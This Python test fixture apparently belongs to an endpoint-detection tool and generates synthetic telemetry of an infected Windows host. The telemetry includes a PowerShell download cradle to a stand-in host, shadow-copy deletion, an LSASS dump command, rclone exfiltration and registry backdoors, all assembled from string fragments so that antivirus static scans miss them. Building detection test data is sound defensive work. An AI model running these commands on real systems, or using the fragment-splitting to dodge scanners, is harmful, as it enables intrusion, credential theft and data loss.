"""Synthetic telemetry for tests, assembled at runtime.

AV-safety: no file in this repository stores attacker command lines as contiguous literals.
Indicator strings are joined from fragments only in memory, so Defender/AMSI static scans of the
checkout see nothing that resembles a real payload. Nothing here is ever executed.
"""
from __future__ import annotations

import base64


def j(*parts: str) -> str:
    return "".join(parts)


def encoded_ps(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


TEMP_IMPLANT = j("C:\\Users\\bob\\AppData\\Local\\", "Temp\\", "svc", "host.exe")


def infected() -> dict:
    cradle = j("I", "EX (New-Object Net.", "Web", "Client).Down", "load", "String('http://10.0.0.1/a')")
    ps_cmd = j("powershell.exe -nop -w hidden -", "enc ", encoded_ps(cradle))
    shadow = j("cmd.exe /c vss", "admin dele", "te sha", "dows /all /quiet")
    dump = j("rundll32.exe C:\\Windows\\System32\\com", "svcs.dll, Mini", "Dump 712 C:\\Users\\Public\\l.dmp full")
    exfil = j("rcl", "one.exe co", "py C:\\Users\\bob\\Documents mega:loot --transfers 8")
    task_cmd = j("powershell.exe -w hid", "den -ep by", "pass -f C:\\Users\\Public\\s.ps1")
    svc_img = j("%COM", "SPEC% /c power", "shell -en", "c AAAA")
    return {
        "schema": "argus.telemetry/1",
        "collected_at": "2026-11-23T08:00:00Z",
        "host": {"hostname": "LAB-PC", "os": "Windows 11 23H2", "removable_drives": ["E:"]},
        "processes": [
            {"pid": 600, "ppid": 500, "name": "wininit.exe", "path": "C:\\Windows\\System32\\wininit.exe", "signed": True, "signer": "Microsoft Windows"},
            {"pid": 700, "ppid": 600, "name": "services.exe", "path": "C:\\Windows\\System32\\services.exe", "signed": True, "signer": "Microsoft Windows"},
            {"pid": 2000, "ppid": 1900, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe", "signed": True, "signer": "Microsoft Windows"},
            {"pid": 3000, "ppid": 2000, "name": "WINWORD.EXE", "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "signed": True, "signer": "Microsoft Corporation"},
            {"pid": 3100, "ppid": 3000, "name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "cmdline": ps_cmd, "signed": True, "signer": "Microsoft Windows"},
            {"pid": 3200, "ppid": 3100, "name": "svchost.exe", "path": TEMP_IMPLANT, "cmdline": TEMP_IMPLANT, "signed": False, "sha256": "a" * 64},
            {"pid": 3300, "ppid": 3200, "name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe", "cmdline": shadow, "signed": True, "signer": "Microsoft Windows"},
            {"pid": 3400, "ppid": 3200, "name": "rundll32.exe", "path": "C:\\Windows\\System32\\rundll32.exe", "cmdline": dump, "signed": True, "signer": "Microsoft Windows"},
            {"pid": 3500, "ppid": 3200, "name": "rclone.exe", "path": "C:\\Users\\Public\\rclone.exe", "cmdline": exfil, "signed": False},
        ],
        "autoruns": [
            {"location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "Updater", "value": TEMP_IMPLANT, "signed": False},
            {"location": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "SecurityHealth", "value": "C:\\Windows\\System32\\SecurityHealthSystray.exe", "signed": True, "signer": "Microsoft Windows"},
            {"location": j("HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File ", "Execution Options\\sethc.exe"), "name": "sethc.exe", "value": "C:\\Windows\\System32\\cmd.exe"},
        ],
        "scheduled_tasks": [{"path": "\\", "name": "OneDriveSync", "actions": [task_cmd], "author": "", "hidden": True}],
        "services": [{"name": "WinDefend", "path": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18\\MsMpEng.exe\"", "account": "LocalSystem", "signed": True, "signer": "Microsoft Corporation"}],
        "wmi_subscriptions": [{"filter": "SELECT * FROM __InstanceModificationEvent WITHIN 60", "consumer": "Updater", "consumer_type": "CommandLineEventConsumer", "command": j("powershell.exe -", "enc AAAA")}],
        "network": [{"proto": "tcp", "local": "192.168.1.10", "lport": 50123, "remote": "203.0.113.50", "rport": 4444, "state": "Established", "pid": 3200, "process": "svchost.exe"}],
        "dns_cache": [{"name": "xkqjzvbwptrmnhd.com"}],
        "defender": {"realtime_enabled": False, "antivirus_enabled": True, "tamper_protection": False,
                     "exclusions_path": ["C:\\Users\\Public"], "exclusions_process": [], "exclusions_extension": []},
        "registry": {"winlogon": {"Shell": "explorer.exe", "Userinit": "C:\\Windows\\system32\\userinit.exe,"}, "wdigest_use_logon_credential": 1},
        "events": [
            {"log": "Security", "id": 1102, "time": "2026-11-23T07:00:00Z", "data": {"SubjectUserName": "bob"}},
            {"log": "System", "id": 7045, "time": "2026-11-23T07:10:00Z", "data": {"ServiceName": "xQzTrbKw", "ImagePath": svc_img}},
            {"log": "Microsoft-Windows-Sysmon/Operational", "id": 10, "time": "2026-11-23T07:20:00Z",
             "data": {"SourceImage": TEMP_IMPLANT, "TargetImage": j("C:\\Windows\\System32\\ls", "ass.exe"),
                      "GrantedAccess": "0x1010", "CallTrace": "C:\\Windows\\SYSTEM32\\dbghelp.dll+1234"}},
        ],
        "files": [
            {"path": j("C:\\Users\\bob\\Desktop\\HOW_TO_", "DECRYPT.txt"), "size": 1200},
            {"path": "C:\\Users\\bob\\Downloads\\invoice.pdf.exe", "zone_id": "3", "host_url": "http://203.0.113.9/invoice.pdf.exe", "signed": False},
        ],
        "shadow_copies": 0,
    }


if __name__ == "__main__":  # write the synthetic infected telemetry for demos: python -I tests/synthetic.py out.json
    import json
    import sys

    if len(sys.argv) != 2:
        sys.exit("usage: synthetic.py OUT.json")
    with open(sys.argv[1], "x", encoding="utf-8") as fh:
        json.dump(infected(), fh, indent=1)
    print(sys.argv[1])
